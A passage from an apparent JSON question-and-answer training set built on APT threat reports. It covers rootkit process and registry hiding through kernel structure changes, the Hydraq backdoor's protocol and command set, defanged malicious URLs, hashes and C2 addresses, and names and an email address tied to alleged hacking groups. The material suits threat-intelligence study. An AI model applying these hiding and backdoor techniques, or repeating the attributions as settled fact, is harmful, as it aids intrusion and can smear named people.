that triggers whenever a handle to a process or thread is created or duplicated in the system. When the handle access originates from user-mode and the image path or PID of the handle target are in the global process list, the driver removes the PROCESS_TERMINATE permission from the DesiredAccess parameter. This results in restricting user-mode processes from acquiring the permissions needed to terminate the threat actor's malicious processes using standard APIs.\nTo hide a process, the rootkit monitors all newly created processes on the system by registering a callback using the PsSetCreateProcessNotifyRoutine API. Whenever a new process is created on the system, the rootkit checks if its path is in the global process list. If so, the process is removed from the ActiveProcessLinks list of the EPROCESS structure, which is a circular doubly-linked list of all running processes on the system. The driver removes the process's list entry from ActiveProcessLinks by linking its Flink (the next entry) to its Blink (the previous entry). As a result, the process is hidden from utilities such as Task Manager.\nSince the EPROCESS structure changes between Windows builds, the rootkit resolves the\nActiveProcessLinks offset dynamically during runtime. It traverses the process's EPROCESS structure, comparing each member to its PID, to locate the offset of the UniqueProcessId field. When found, the\nActiveProcessLinks offset is also easily located as it is the next field in the EPROCESS structure. The older rootkit samples use the hiding mechanism on Windows 8 and below, while the newer samples use it on only Windows 7 and below.\nBy default, the global process list is initialized with the path *\\qwerty.exe. However, we have not observed any file with this name related to the campaign.\nMedium Headline: Registry Keys\nThe rootkit hides registry keys from users using Microsoft's Registry Editor. The code is based on an open-source (<https://github.com/geemion/Record/blob/master/HideReg.c>)project published by a Chinese developer.\nThe HHIVE->GetCellRoutine functions of keys in the global registry keys list are replaced with a filter function. When the path of the querying process is *\\WINDOWS\\REGEDIT.EXE, the function simply returns 0 in place of the key node.\nBy default, the global registry list is initialized with the rootkit's registry key\n(\\REGISTRY\\MACHINE\\SYSTEM\\CURRENTCONTROLSET\\SERVICES\\CRTSYS).\n\nWhat are the primary objectives and methods employed by the Fire Chili rootkit used by Deep Panda to hide and protect malicious artifacts on infected systems?",
    "output": "A: The primary objective of the Fire Chili rootkit is to hide and protect malicious artifacts from user-mode components, including files, processes, registry keys, and network connections. The rootkit achieves this by using Direct Kernel Object Modification (DKOM), which involves undocumented kernel structures and objects. It relies on specific OS builds to avoid crashing the infected machine. The rootkit has four global lists, one for each aspect, that contain the artifacts to hide. It implements a filesystem minifilter to hide files, prevents process termination by denying the PROCESS_TERMINATE access right, hides processes by removing them from the ActiveProcessLinks list, and hides registry keys by replacing the GetCellRoutine functions with a filter function. The rootkit's IOCTLs allow dynamic configuration of the lists through its control device \\\\Device\\\\crtsys, enabling the dropper to hide the driver's registry key, the loader and backdoor files, and the loader process.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Overview\nResearchers from Zscaler and\t\n \u00a0Seculert separately identified\t\n \u00a0incidents and\t\n \u00a0threats discussed\t\n \u00a0in\t\n \u00a0this report. Within a private security forum we discussed and determined that\t\n \u00a0we had identified related incidents.\t\n \u00a0Zscaler and Seculert collaborated on\t\n \u00a0this report to aggregate and correlate our\t\n \u00a0findings along with open-\u00ad\u2010source intelligence (OSINT) to detail a\t\n \u00a0lesser-\u00ad\u2010known \"MSUpdater\"\t\n \u00a0remote access Trojan (RAT) and its linkage\t\n \u00a0to current targeted attacks and others dating back to\t\n \u00a0at least early 2009. Foreign\t\n \u00a0and\t\n \u00a0domestic (United\t\n \u00a0States) companies with\t\n \u00a0intellectual property dealing in\t\n \u00a0aero/geospace and\t\n \u00a0defense seem to be some of the recent industries\t\n \u00a0targeted in these attacks.\nThe\t\n \u00a0goal of this report\t\n \u00a0is to aggregate information, draw some correlations, and provide an overview of\t\n \u00a0this threat\t\n \u00a0to facilitate its identification, \t\n \u00a0detection, and functionality. With this goal in mind, we also aim not to reveal anything that\t\n \u00a0might\t\n \u00a0disrupt\t\n \u00a0any investigations or state something\t\n \u00a0without additional open-\u00ad\u2010source corroboration. We as\t\n \u00a0security\t\n \u00a0researchers\t\n \u00a0believe that our success\t\n \u00a0is\t\n \u00a0not measured by\t\n \u00a0how much information we collect, but in how we use and share\t\n \u00a0the\t\n \u00a0information to better secure\t\n \u00a0and protect the Internet\t\n \u00a0community from threats. We hope that the information within this report helps to detect and remediate\t\n \u00a0this threat within organizations.\n\nHow did the collaboration between Zscaler and Seculert contribute to the identification and analysis of the MSUpdater RAT, and what were the primary goals of their joint report?",
    "output": "The collaboration between Zscaler and Seculert was instrumental in identifying related incidents involving the MSUpdater RAT through discussions in a private security forum. By aggregating and correlating their findings with open-source intelligence (OSINT), they were able to detail the lesser-known MSUpdater RAT and its connection to targeted attacks dating back to at least early 2009. The primary goals of their joint report were to aggregate information, draw correlations, and provide an overview of the threat to facilitate its identification, detection, and understanding of its functionality. Additionally, the report aimed to assist in detecting and remediating this threat within organizations without disrupting ongoing investigations or making uncorroborated statements.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Small Headline: Citizen Lab research into targeted digital threats against civil society confirms that civil society groups face grave threats from targeted malware attacks, despite being under-resourced to defend against them.\nThe case highlighted here is no exception: lack of IT and security resources have made it difficult for the Syrian opposition to address targeted and persistent digital threats against them. In addition, if ISIS is indeed responsible, this case suggests how easy it is for belligerents in a conflict to begin fielding basic offensive digital capabilities, and how quickly the capabilities can be pointed at unarmed civil society groups.\nBig Headline: Warning: Social Engineering Thrives in Syrian Context\nThis attack was exceptionally targeted, and clearly reflected the work of an actor familiar with the operations of the targeted organization. As most organizations working on issues surrounding Syria are aware, malware delivered with good social engineering is a constant source of danger.\nThis particular attack can be prevented by not opening files sent by unknown persons. However, many attacks in Syria come from hijacked accounts and impersonate people known to the targets. Social engineering remains an unsolved problem, and continues to compromise groups throughout the Syrian opposition and their supporters.\nThis attack reaffirms the dangers posed by social engineering attacks, whether they deliver phishing campaigns or malware. The circumstantial evidence of ISIS involvement suggests that groups working on topics that ISIS considers a threat, and their partner organizations and supporters, should urgently examine their security policies and assess the possible risks to their operations, and the consequences of exposure of sensitive information to ISIS.\nEven if the link to ISIS turns out to be incorrect, it is possible that this will be a threat in the future.\nIndividuals and groups at risk can also (<https://citizenlab.org/2014/12/malware-attack-targeting-syrian-isis-critics/www.cyber-arabs.com>)consult materials in Arabic provided by Cyber Arabs including a series of very accessible (<https://www.cyber-arabs.com/?page_id=8410>)videos on digital security.\nAnswer this question: How does the use of social engineering in targeted malware attacks pose a significant threat to civil society groups, particularly those operating in conflict zones like Syria? Explain the challenges associated with defending against these types of attacks and provide recommendations for mitigating these risks.",
    "output": "Social engineering in targeted malware attacks poses a significant threat to civil society groups because it exploits human trust and relationships, making it easier for attackers to deliver malicious content. In the Syrian context, where groups are under-resourced and lack adequate IT and security infrastructure, defending against these attacks is particularly challenging. Many attacks come from hijacked accounts and impersonate people known to the targets, making it difficult to discern genuine communications from malicious ones. This problem remains unsolved and continues to compromise groups throughout the Syrian opposition and their supporters. To mitigate these risks, individuals and groups at risk should urgently examine their security policies and assess the possible risks to their operations. They should also consider the consequences of exposing sensitive information to hostile actors like ISIS. Additionally, consulting materials and resources on digital security, such as those provided by Cyber Arabs in Arabic, can help improve awareness and preparedness.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Metadata Analysis:\nAs mentioned earlier, during the email exchanged with Zubair Khan, he sent TCIRT a Microsoft Word document (.docx). In reviewing the document metadata for \"Response_ThreatConnect.docx \", TCIRT identified that it contained the creator properties of \"hp.\" TCIRT compared the metadata of two benign BITTERBUG-associated decoy documents from July 2013 and found that both also had the author of \"hp\" (Figure 10).\n39 http://www.know-hosting.com/view/27108-digitallinx.html\nWhile the author field of \"hp\" doesn't conclusively prove a relationship, it contributes to the body of circumstantial evidence which links properties of the official Tranchulas response to the properties of decoy documents that were used in conjunction with BITTERBUG targeting campaigns.\nMedium Headline: Malware Analysis:\nCyberSquared Inc. partnered with FireEye for a second technical review of the malware associated with this activity. FireEye analyzed the malware, which they call BITTERBUG, and determined it to be a custom backdoor. The backdoor relies on various support components, including the non-malicious, publically available Libcurl40 for installation, launch, and communications. In some variants, BITTERBUG has the ability to automatically target and exfiltrate files with extensions such as .doc, .xls, .pdf, .ppt, .egm, and .xml. The full malware report is included in Appendix A: Malware Details.\nThe earliest evidence of the malware family dates to April 2013, based on Portable Executable (PE) compile times, with more than 10 BITTERBUG variants observed to date. The earliest samples of BITTERBUG contain the \"Tranchulas\" debug path (below), as mentioned in the August 2013 TCIRT blog post. These BITTERBUG variants were probably used in attacks around summer 2013, using possible lures related to the then-recent death of \"Sarabjit Singh\" (an Indian national imprisoned in Pakistan) and an Indian Government pension memorandum. As stated in the original blog (and raised in the formal Tranchulas response), several binaries contain references to \"Cath\" in the debug path. It is important to note that the \"Cath\" files are support components and not BITTERBUG variants, so it is probable that these were developed by another party but are a required component of the family.\nC:\\Users\\Tranchulas\\Documents\\Visual Studio 2008\\Projects\\upload\\Release\\upload.pdb C:\\Users\\Cath\\documents\\visual studio 2010\\Projects\\ExtractPDF\\Release\\ExtractPDF.pdb C:\\Users\\Cath\\documents\\visual studio 2010\\Projects\\Start\\Release\\Start.pdb\nAdditional BITTERBUG variants were compiled in June and July 2013 that contained different identifiers in the debug paths: \"Cert-India\" (3 samples) and \"umairaziz27\" (1 sample).41 The presence of \"umairaziz27\" in a debug path from one sample makes us wonder if this represents an operational security mistake. The debug path of \"umairaziz27\" led us to Twitter42 and LinkedIn43 accounts (on which a matching alias is used) that belong to a Tranchulas employee named Umair Aziz, who identified himself as an Information Security Analyst44 and graduate of National University of Sciences and Technology45 (NUST).46 One of these samples was probably used in attacks in late summer 2013, using a \"leaked report\" lure which contained a decoy document related to Pakistan's alleged inability to locate Osama Bin Laden.\nC:\\Users\\Cert-India\\Documents\\Visual Studio 2008\\Projects\\ufile\\Release\\ufile.pdb C:\\Users\\umairaziz27\\Documents\\Visual Studio 2008\\Projects\\usb\\Release\\usb.pdb\nAfter publication of the TCIRT blog and our communications with Tranchulas occurred in August 2013, no new samples of BITTERBUG or its support components (based on compile times) were identified until September (various support components) and October (a new BITTERBUG variant). Interestingly, the samples compiled following the blog publication used entirely new and generic debug paths (Figure 11) as well as a compilation tactic to conceal the C2 address from static analysis. Between September and December, we observed more variations of BITTERBUG and its support components in terms of packaging, host-based activities,\n40 http://curl.haxx.se/libcurl/\n41 Appendix A: Malware Details\n42 https://twitter.com/umairaziz27\n43 http://pk.linkedin.com/in/umairaziz27\n44 https://twitter.com/umairaziz27/status/332049978878996481\n45 www.nust.edu.pk\n46 http://www.nust.edu.pk/INSTITUTIONS/Directortes/ilo/Download%20Section/Graduate%20Profile%20SEECS%20%20BICSE.pdf\nand decoys (or the lack of them) compared to the samples before our blog post. This could indicate that the threat actors were aware of the blog post and modified their malware and related components to distance them from prior indicators.\nQ: How does the metadata analysis of the 'Response_ThreatConnect.docx' document contribute to linking the Tranchulas response to BITTERBUG targeting campaigns? Explain the significance of the 'hp' author field in this context.",
    "output": "The metadata analysis of the 'Response_ThreatConnect.docx' document revealed that it contained the creator properties of 'hp'. This is significant because when TCIRT compared the metadata of two benign BITTERBUG-associated decoy documents from July 2013, they found that both also had the author of 'hp'. While the author field of 'hp' doesn't conclusively prove a relationship, it contributes to the body of circumstantial evidence which links properties of the official Tranchulas response to the properties of decoy documents that were used in conjunction with BITTERBUG targeting campaigns. This suggests a potential connection between the creators of the Tranchulas response and the BITTERBUG operations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Fake blog with an Indian military emphasis leads to MSIL/Crimson and more\nWhile conducting research related to MSIL/Crimson, Proofpoint researchers discovered a malicious blogspot.com site (Fig. 6), intribune.blogspot[.]com, that appears to have been set up to lure Indian military officials into becoming infected with MSIL/Crimson, njRAT, and possibly other malicious tools. This site is likely operated by the same actor(s) that carried out the previously discussed attacks on Indian embassy officials based on shared C&C infrastructure as discussed in the Cluster Analysis section. Most of the published stories contain some method of directing potential victims to a malicious payload, although a few of the stories did not contain any malicious code at time of analysis. In the following articles from this site, we see the threat actors conducting their malicious activities in multiple ways:\n1. Using hyperlinks via an image or text\n2. Using the same hypertext link in the article text, on the story's image, and in an iframe\n3. The final article in this section contains a link to an additional website that is likely operated by the same threat actor(s) and connected to other email campaigns\nMedium Headline: Lure articles\n4 Sikh Army Officers being trialed in military court on alleged involvement with KLF\nLink: hxxp://intribune.blogspot[.]com/2015/11/4-sikh-army-officers-being-trialed-in.html\nMalicious Document Location: hxxp://bbmsync2727[.]com/news/4%20Sikh%20Army%20Officers%20being%20trialed. doc\nDocument: 0197ff119e1724a1ffbf33df14411001\nType: Exploit,CVE-2012-0158,Embedded Payload\nDropped: njRAT - 27ca136850214234bcdca765dfaed79f\nC&C: 5.189.145[.]248:10032\nOne notable difference between this article and the rest is that it contained an iframe pointing to the same document linked to via the \"Read More\" hyperlink. This iframe causes visitors to be prompted to download the document immediately upon visiting, as well as from the top level of the malicious website.\nMedium Headline: Seventh pay commission recommends overall hike of 23.55%\nLink: hxxp://intribune.blogspot[.]com/2015/11/seventh-pay-commission-recommends.html\nAt time of analysis, this web page contained no malicious links; however, we discovered a document that was likely either prepared for this page or was previously linked to by this page.\nMalicious Document Location: hxxp://bbmsync2727[.]com/cu/seventh%20pay%20commission%20salary%20calculator. xls\nDocument: 0e93b58193fe8ff8b84d543b535f313c\nAdditional Document Location: hxxp://bbmsync2727[.]com/cu/awho_handot_2015.xls\nVBS Location: hxxp://bbmsync2727[.]com/cu/su.exe\nPayload (older): 07e44ffcffde46ad96eb9c018bed6193 (DarkComet)\nC&C (older): 5.189.145[.]248:1453\nPayload (newer): 708a1af68d532df35c34f7088b8e798f (Luminosity Link RAT)\nC&C (newer): 5.189.145.248:6318\nMedium Headline: AWHO-Defence and Para-Military Forces Personnel Plots Scheme 2016\nP\u0141es.s Release: Army Welfar,e Housing O\u0141aniz.ation ,(Kashmir House, , Raja Marg, New De\u00b7lhi_) launches new me,ga housing scheme with unique dwe\u00b7lling units for serving officers of Army/Navy/ Air Force and Para Military Forces_ Send 100 ? by postal orders or DD to obtain Master Brochure by re-g iste re,eJ post\nLast Date to apply is 31st O,ecember 2015_ The, de,tail of new and e,xisting projects are attached in password protede-d she-et\nGET CALL DETAIL RECORDS ONLINE\nFigure 14: Article lure ultimately leading to MSIL/Crimson and another malicious website\nThe AWHO article contains a link to hxxp://cdrfox[.]xyz/ via the  \"GET CALL DETAIL RECORDS ONLINE\" hyperlink. This website is likely operated by the same actor(s) and is capable of delivering a VBS-based malicious document to unsuspecting victims (Fig. 15). Again, there is an obvious India-targeted theme that suggests this malicious website is specifically targeted at that nation. After using the number submission form, victims are directed to another page containing the final link to download a malicious document (Fig. 16).\nMedium Headline: Document Details\nLocation: hxxp://fileshare[.]attachment[.]biz/?att=1455255900\nDocument: 18711f1db99f6a6f73f8ab64f563accc\nDocument Name: \"Call Details Record.xls\"\nType: VBS Macro\nVBS Location: hxxp://afgcloud7[.]com/logs/ssc.mcom\nPayload: 3cc848432e0ebe25e4f19effdd92d9c2 (MSIL/Crimson Downloader)\nDownloaded MSIL/Crimson RAT: 463565ec38e4d790a89eb592435820e3\nAdditional payloads were found on the same server but in a different directory:\nhxxp://afgcloud7[.]com/com/psp.dlc-bk (hash: 62d254790834f30a79ee79305d9be837, also previously named psp.dlc) hxxp://afgcloud7[.]com/com/psp.dlc (hash: dd0fc222852f5d12fda2fb66e61b22f6)hxxp://afgcloud7[.]com/upld/updt.dll (hash: 0ad849121b4656a239e85379948e5f5d)\nBoth files in the \"/com/\" directory are malicious droppers that ultimately drop a decoy Excel spreadsheet and a MSIL/Crimson downloader. The spreadsheet is themed towards the Armed Forces Officials Welfare Organization (AFOWO) located in India, while the dropped downloader and downloaded RAT communicate with the same C&C as many of the previously discussed samples. An Excel spreadsheet named \"AFOWO Broucher 2016.xls\" (hash: 98bdcd97cd536ff6bcb2d39d9a097319) was also found containing a malicious macro that attempts to download a payload from hxxp://afgcloud7[.]com/com/psp.dlc . Additionally, the IP address (50.56.21[.]178) resolved from email. books2day.com (used in the embassy attacks). This IP has also recently resolved to email.afowoblog[.]in. We would not be surprised if an email address using @afowoblog.in was used to send the malicious \"AFOWO Broucher 2016.xls\" spreadsheet. Additional research related to this domain is provided in the Cluster Analysis section.\nMedium Headline: 0ad849121b4656a239e85379948e5f5d\nThe payload found in the \"/upld/\" directory (md5: 0ad849121b4656a239e85379948e5f5d) is the MSIL/Crimson SecApp module capable of downloading the full MSIL/Crimson RAT and all subsequent modules. Additionally, this payload drops a decoy document (Fig. 17) with the filename: \"Cv of IMA Chief.docx\" (hash: 8e5610d88c7fe08ac13b1c9f8c2c44cc). The decoy document contains information regarding a possible Brigadier General whose last and current position (according to the decoy) is the Chief of International Military Affairs Department Ministry Defence (sic) of Afghanistan.\nMedium Headline: Cluster 1 - Operation Transparent Tribe and More\nThe first cluster is the largest with activity from over one hundred samples dating as far back as 2012 (Fig. 18). For this cluster, we started our analysis beginning with the email attacks on the Indian embassies and the fake Indian news blog. The activity surrounding those two events uncovered numerous other samples hosted on attacker-controlled C&C that then lead to at least one additional email attack campaign. On one of the C&Cs we discovered a Python-based RAT (Python/Peppy) whose activity very closely clusters to Operation Transparent Tribe. We have also observed this RAT being downloaded and executed along with MSIL/Crimson by Andromeda downloaders. In addition to Crimson and Peppy, we have observed the usage of Luminosity Link RAT, njRAT, Bezigate, Meterpreter, and several custom downloaders.\nThe attackers responsible for this activity appear have to used a mixture of compromised infrastructure (e.g., sahirlodhi[.] com) and infrastructure owned solely by them (e.g., bbmsync2727[.]com). In many cases, the attackers used common patterns in naming their domains:\n\u2022 sync in domain name and file name\n\u2022 Repeated use of bb in domain name or filename, mostly bbm\n\u2022 Ending second level domain names in four digits\nAdditionally, this cluster of activity has numerous instances where Contabo GmbH was used for C&C. However we never used that as a sole item to group activity together under this cluster. Next, we will discuss an additional email attack, the attachment.biz activity, and lastly the afowoblog.in domain, all of which we believe fall into this cluster.\nSmall Headline: Email campaign using \"2016 Pathankot attack\" Lure\nWhile researching this activity, we discovered an additional email attack campaign using the 2016 Pathankot attack as a lure (Fig. 19). This attack utilized a URL (hxxp://comdtoscc.attachment[.]biz/?att=1451926252) to deliver a compressed file (md5: f689471d59e779657bc44da308246ac4) containing two MSIL/Crimson payloads using 193.37.152[.]28:9990 as their C&C.\nThe attackers further increased the believability of their attack by including decoy files with each of the MSIL/Crimson payloads:\nSample 1: 65f6143d69cb1246a117a704e9f07fdc\nOriginal name: \"Call Record and Tracking Route.scr\"\nDropped decoy: 2f821d8c404952495caae99974601e96,Audio file with image (Fig. 20)\nDecoy name: \"Call Record and Tracking Route.mp3\"\nSample 2: 723d85f905588f092edf8691c1095fdb\nOriginal name: \"detail behind the scenes.scr\"\nDropped decoy: a523b090e9a7e3868d8d1fde3e1ec57d,PDF (Fig. 21)\nDecoy name: \"detail behind the scenes.pdf\"\n\nBased on the above text, answer a question. How did the threat actors behind MSIL/Crimson utilize the fake blogspot.com site to target Indian military officials, and what methods did they employ to deliver malicious payloads?",
    "output": "The threat actors behind MSIL/Crimson created a malicious blogspot.com site, intribune.blogspot[.]com, designed to lure Indian military officials. They employed various methods to deliver malicious payloads, including using hyperlinks via images or text, embedding the same hypertext link in the article text, story images, and iframes. One notable example involved an article about '4 Sikh Army Officers being trialed in military court,' which contained an iframe that prompted visitors to download a malicious document immediately upon visiting the page.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How did the investigators identify and track the activities of the YDTeam hacking group associated with the Winnti APT?",
    "output": "The investigators identified the YDTeam hacking group by searching for the string 'ydteam' on the internet, which led them to various references on the Chinese segment of the web. They found that YDTeam was a hackers group with members such as 't-bag', 'b4che10r', 'Shalyse', and 'killer'. The group had a website, ydteam.cn, registered by Wei Nan, who used the email wn6805@126.com. By tracing this email and associated QQ ID, the investigators uncovered additional details about the group's activities, including potential fraudulent behavior and educational background.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Very Small Headline: 3.4.2 SYNchronize-ACKnowledgement\n[Listing 07 - Constructing Initial Handshake routine ]\nThe client will identify the initial SYN packet sent by the server. If valid, the client will respond a SYNchronize ACKnowledgement packet 20 bytes in size. The sets of bytes are encrypted using a bitwise XOR with 0xCC as the key.\nCC CC CC CC CD CC CC CC CD CC CC CC CC CC CC CC AA AA AA AA\n[Listing 08 - Acknowledgment data decryption routine ]\nThe server will validate the SYN-ACK packet from the client expecting the following decrypted values:\n00 00 00 00   01 00 00 00   01 00 00 00   00 00 00 00  00 00 00 00\nTake note that,\nVery Small Headline: 3.4.3 ACKnowledge\nOnce the server receives the expected SYN-ACK packet, it will respond by sending an ACKnowledgement of receipt. The following tasks are performed:\na. Collect the following information from the compromised system.\n\u2022 Computer name\n\u2022 CPU clock speed\n\u2022 Memory status \u2013 specifically gets the amount of actual physical memory in bytes and converts it to megabytes.\n\u2022 Operating system information\n[ Listing 09 - Collected system information ]\nb. Encrypt the information collected using a custom encryption were the key used is derived from the result of GetTickCount API. The encrypted data will be encrypted again using a bitwise NOT.\nc. Generate a CRC hash value of the encrypted information.\nd. Send the collected information to the client.\nThe server is now ready to accept backdoor commands from the remote attacker.\nThe complete 3-way handshake process between the backdoor server and the client will look like this:\n[Listing 12 - The backdoor 3-way handshake process]\nVery Small Headline: 3.5.1 Client's Information Header Format\n[Figure 1 - The client process the server information header.]\nThe constructed information header is 20 bytes in size in the following format: (Note: The values in Table 01 are for illustration purpose only)\n[Table 01 - Client's Information Header Format]\nThe client's Command Reference and Task will be discussed in the section \"\". It is important to take note that the information from the server is encrypted using a bitwise NOT, while the information from the client is encrypted using a bitwise XOR with 0xCC as the key. (see Listing 12)\n[Table 02 - Information Header Definition]\nVery Small Headline: 3.5.2 Server's Information Header Format\n[Figure 02 - The client process the server information header.]\nThe constructed information header is 20 bytes in size with the following format. (Note: The values in Table 03 are for illustration purpose)\n[Table 03 - Server's Information Header Format]\nThe difference between the client and server header information is the Server Info Reference (offset 0x00) and Information Code (offset 0x04). Based on our simulation and code inspection, the backdoor client uses the following numeric codes to identify the content of the received information: (Note: The Backdoor Command and Task is discussed in section )\n[Table 04 - Server Information Header Definition]\nSmall Headline: 3.6 Backdoor Command Reference\nAside from the malware code obfuscated with JMPs and NOPs, Win32/Hydraq also constructs a reference table that will be used by the Command Reference field found in the to convert the actual commands.\nOnce the server receives a packet from the client, it performs the following task to convert the client's Command Reference value:\n1. Perform a bitwise XOR with 0xCC as the key in the information transmitted.\n2. The value in the Command Reference field will be added with negative two (-2).\n3. Match the value obtained in Step 2 in the Table 05 to get the Actual Command.\nTo elaborate on this further, let's take an example where the remote attacker requests information about the logical drive of the compromised system.\nIn Table 05, the Command Reference for retrieving the logical drive is Command 0x04. (see Table 06 for Backdoor Command and Task reference)\nIn this example, the Command Reference is CA CC CC CC, and the Task Number is CC CC CC CC.\nConverting the correct instruction to execute:\n[Table 05 - Backdoor Command Reference]\n3. Resulting match:\nListing 13 displays the captured communication between the client and server retrieving the logical drive information of the compromised system.\n[Listing 13 - Captured client server communication ]\nSmall Headline: 3.7 Backdoor Command Table\nThe Win32/Hydraq backdoor features 10 command switches, which theoretically allow the remote attacker to perform almost everything. An attacker can manipulate files, registries, services, process, privileges, search files and directories, remote download, update configurations, open applications, and steal any desired information. Attackers can initiate real-time graphical control and watch a user's desktop using Command 0x07 Task 0x0b (see Appendix D for discussion of acelpvc.dll and VedioDriver.dll installation).\n[Table 06 - Backdoor Command and Task Descriptions]\nSmall Headline: 3.9 Backdoor Commands In Action\n\"Primary goal of the attackers was accessing the Gmail accounts of Chinese human rights activist\"\n- statement published in a Google blog post entitled \"A new approach to China\".\nMalware designed for spying and obtaining sensitive information must have the following offensive capabilities:\n1. Probing - the act of searching, exploring, and investigating.\n2. Exfiltration of sensitive information.\n3. Surveillance - the ability to capture images, audio and/or video.\n4. Covert Communication Channel - is a hidden communication embedded into the header and/ or payload of an overt communication channel to avoid discovery of on-going attacks over the network.\n5. Covering Tracks - the ability to stay undetected and avoid forensic discovery.\nLet's summarize and see what we have learned and discovered from Hydraq's code.\nVery Small Headline: 3.9.1 Probing and exfiltration of sensitive information\nThe Windows Registry is the heart of the Windows Operating System. It stores users profile, installed applications, privileges for applications and folders, hardware profiles, current logged-on information, mounted devices, the MRU list, wireless network information, LAN computers and passwords [10].\nUsing Command 0x03 Task 0x00 and Task 0x01, a remote attacker using Hydraq can substantially extract useful information from Windows Registry.\nUsing Command 0x01 Task 0x00, a remote attacker using Hydraq can find out the services that are available on the compromised system. Windows services display what type of connections is available that attackers can take advantage of to administer further attacks.\nUsing Command 0x04 Task 0x00, a remote attacker using Hydraq can determine all logical drives and if the disk drive is a removable, fixed, CD-ROM, or network drive. (see Backdoor Command Reference Listing 13 for the captured communication of client-server)\nThe attacker can then execute Command 0x04 Task 0x07 to search a directory or Command 0x06 Task 0x01 to search a file.\nThrough Command 0x03, a remote attacker using Hydraq can manipulate the registry and use Command 0x05 Task 09 to store and update gathered information. Command 04 Task 09 retrieves the stored information and assures the integrity of the file sent to remote attacker.\nThe backdoor can retrieve any file and information at anytime using Command 0x06 Task 01.\nHydraq reads the contents of network.ics using Command 0x09 Task 0x01. Network.ics contains information including network name and number mapping for local area network.\nThe attacker can manipulate the routing table to redirect traffic to the compromised system. The Command 0x04 Task 0x02 can be used to open or execute a file or program, and Command 0x04 Task 0x08 can be use to update network.ics content.\nThus, it can perform a man-in-the-middle attack, where attacker can intercept traffic and capture information.\nVery Small Headline: 3.9.2 Surveillance\nHydraq probing capabilities can determine whether the compromised machine has audio/video enabled applications and devices (for example instant messengers and webcam connection). The attacker can use available application and devices to capture images, voice and video for surveillance.\nHowever, as discussed earlier, Hydraq can also initiate a real-time graphical control and watch a user's desktop using Command 0x07 Task 0x0B (see Appendix D for discussion of acelpvc.dll and VedioDriver.dll installation).\nVery Small Headline: 3.9.4 Covering Tracks\nCovering tracks is important in hacking. It extends or allows the attacker to stay undetected for a long period of time. It also removes evidence of hacking and lessens the chances of identification.\nIf Hydraq can escalate privileges it can also adjust them; if it can execute and run any program/ application, it can terminate it. It can remove its traces in services, registry, file/s, folder/s, change file attributes and move file/s into different locations. It can also force shutdowns or reboot the system, which can remove valuable traces in memory to avoid digital forensics discovery.\nFurthermore, in Command 0x04 Task 0x02 the remote attacker can clear Application Event logs.\n1 Overt channel is any communication path for the authorized data transmission within a computer system or network. HTTP and HTTP SSL is an overt channel.\nVery Small Headline: 3.9.5 Expandable Features\nIn Command 0x02 Task 0x00, the remote attacker can download and execute arbitrary files onto compromised systems, and it can adjust process token privileges using Command 0x00 Task 0x00. This sets of commands further expands the capability of the attacks.\nCommand 0x00\nTask 0x00\nAdjust Token Privilege / Access Privilege Escalation and Enumerate Process.\nThe backdoor configuration that is stored in the registry can be updated using Command 05 Task 0x08. This means that the remote attacker can modify and change the connection details at anytime.\nAnswer this question: What information does the Hydraq server collect from the compromised system during the ACKnowledgement phase, and how is this information encrypted?",
    "output": "During the ACKnowledgement phase, the Hydraq server collects the following information from the compromised system: computer name, CPU clock speed, memory status (amount of actual physical memory in bytes converted to megabytes), and operating system information. This information is first encrypted using a custom encryption method where the key is derived from the result of the GetTickCount API. The encrypted data is then further encrypted using a bitwise NOT operation. Additionally, a CRC hash value of the encrypted information is generated before sending it to the client.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Introduction\nWaterbug is the name given to the actors who use the malware tools  (also known as Tavdig and Epic Turla) and Trojan.Turla (also known as Carbon, Uroburos, and Snake). Believed to have been active since at least 2005, it is likely that the group was responsible for the 2008 compromise of US Central Command that reportedly resulted in a clean-up operation that lasted almost 14 months.\nMore recently, Waterbug used a zero-day exploit against the  (CVE-2013-5065), targeted emails, stolen certificates, and a sophisticated watering-hole distribution network known as Venom to compromise its victims. Waterbug has successfully targeted and compromised over 4,500 computers across more than 100 countries. Targets include government institutions, embassies, and education and research facilities.\nThe malware used on victims' computers, variants of Trojan.Turla and Trojan.Wipbot, are likely developed by or for the Waterbug group. Trojan.Turla has four different sub-versions, something that may indicate professional development with code shared among multiple teams.\nBecause of the targets chosen, the use of at least one zero-day exploit, a large network of compromised websites, and the advanced nature of the malware used, Symantec believes that Waterbug is a state-sponsored group.\n\nBased on the above text, answer a question. Why does Symantec believe that the Waterbug attack group is state-sponsored? Explain the key indicators that support this conclusion.",
    "output": "Symantec believes that the Waterbug attack group is state-sponsored due to several key indicators. Firstly, the group has targeted high-value entities such as government institutions, embassies, and education and research facilities, which are typical targets for state-sponsored espionage. Secondly, Waterbug has employed advanced techniques including the use of at least one zero-day exploit (CVE-2013-5065), indicating significant resources and expertise. Additionally, the group has utilized a large network of compromised websites for watering-hole attacks, demonstrating a sophisticated infrastructure. Lastly, the malware used, such as Trojan.Turla and Trojan.Wipbot, shows signs of professional development, with Trojan.Turla having four different sub-versions, suggesting code sharing among multiple teams. These factors collectively point to the involvement of a well-resourced and organized entity, likely a nation-state.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
